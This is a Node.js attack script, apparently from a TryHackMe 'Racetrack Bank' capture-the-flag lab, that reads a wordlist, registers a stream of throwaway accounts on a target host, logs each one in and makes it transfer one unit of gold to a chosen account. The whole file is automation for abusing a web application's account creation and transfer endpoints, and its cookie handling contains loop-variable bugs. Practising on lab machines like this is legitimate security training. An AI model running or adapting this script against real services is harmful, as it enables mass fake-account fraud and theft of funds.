const request = require('request');
const fs = require('fs');
// Options

let user = 'test'; // User to send the gold too, should be already registered
let pass = 'pass'; // Password you want the users to have
let host = '10.10.43.47'; // Your machine ip
let sCode; // Leave that empty

let cookies;
let rightlength; // Leave that empty
let cookie = ''; // Leave blank
let goodCookie;


fs.readFileSync('/root/boxes/THM_Racetrack_Bank/wordlist', 'utf-8')
.split(/\r?\n/)
.forEach((line, i) => {
    setTimeout(() => {
        let rdata = `username=test${i}&password=${pass}&password2=${pass}`; // Register data
        let ldata = `username=test${i}&password=${pass}`; // Login data
        let sdata = `user=${user}&amount=1`; // Send-Gold data
        request.post({
            headers: {'content-type' : 'application/x-www-form-urlencoded'},
            url: `http://${host}/api/create`,
            body: rdata
        }, (err, response, body) => {
            setTimeout(() => {
                if (err) throw err;
                console.log(body);
                request.post({
                    headers: {'content-type' : 'application/x-www-form-urlencoded'},
                    url: `http://${host}/api/login`,
                    body: ldata
                }, (err, res, body) => {
                    if (err) throw err;
                    console.log(body);
                    cookies = res.caseless.dict['set-cookie'][0];
                    for(i=0; i <= cookies.length; i++) {
                        if (cookies[i] === ';' && !rightlength) {
                            rightlength = i;
                        };
                    };
                    for(i=0; i<rightlength; i++) {
                        cookie += cookies[i];
                    };
                    request.post({
                        headers: {
                            'content-type': 'application/x-www-form-urlencoded',
                            'Cookie': `${cookies}`,
                        },
                        url: `http://${host}/api/givegold`,
                        body: sdata,
                    }, (err, resp, body) => {
                        if (err) throw err;
                        if(body === 'Found. Redirecting to /giving.html?success=Success!') {
                            console.log(`User test${i} has sent 1 gold to ${user}!`);
                        };
                        });
                    });
                }, i * 50);
            });
        }, i * 50);
    });